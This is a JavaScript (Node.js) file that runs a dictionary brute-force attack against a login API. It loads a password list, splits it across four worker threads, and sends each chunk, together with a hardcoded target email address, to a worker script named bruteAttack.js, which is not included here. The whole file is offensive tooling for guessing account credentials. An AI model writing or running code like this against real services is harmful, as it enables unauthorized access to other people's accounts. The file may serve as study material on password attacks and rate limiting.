import fs from 'fs'
import chalk from 'chalk'
import 'dotenv/config'
import { Worker } from 'worker_threads'
const API_URL = process.env.API_URL
const email = 'sami@gmail.com'

// Number of threads
const numThreads = 4;

function startWorker(data){
    return new Promise((resolve,reject)=>{
        const worker = new Worker('./src/Brute-force-attack-dictionary-w-thread/bruteAttack.js',{
            workerData:data
        })
        worker.on('message',resolve)
        worker.on('error',reject)

        // process exit
        worker.on('exit',(code)=>{
          // Throw error if returned code !=0
            if(code !==0 ){
                reject(new Error('worker stopped'))
            }
        })
    })
}

async function main() {
  try {
    // get array of passwords from file password.txt
    const passwords = fs.readFileSync('./password.txt','utf-8').split('\n').map(password=> password.trim())
    // Get Size of division by divide length of passwords by number of threads
    const chunkSize = Math.ceil(passwords.length / numThreads);
    // Store chunks into an array
    const passwordChunks = [];
    
    for (let i = 0; i < passwords.length; i += chunkSize) {
      passwordChunks.push(passwords.slice(i, i + chunkSize));
    }
    
    // return promise for every chunks (every chunk will be execute brute attack on their thread)
    const workerPromises = passwordChunks.map(chunk => startWorker({
      API_URL,
      email,
      passwords: chunk
    }));
    // Execute all promises
    await Promise.all(workerPromises);
    console.log(chalk.grey('Brute force attack completed.'));

  } catch (err) {
    // Catch error if failed to read file or Error in brute attack
    console.error(chalk.grey.bgRed('Error in brute force attack:', err));
    console.log(err.message);
  }
    
  }
  main();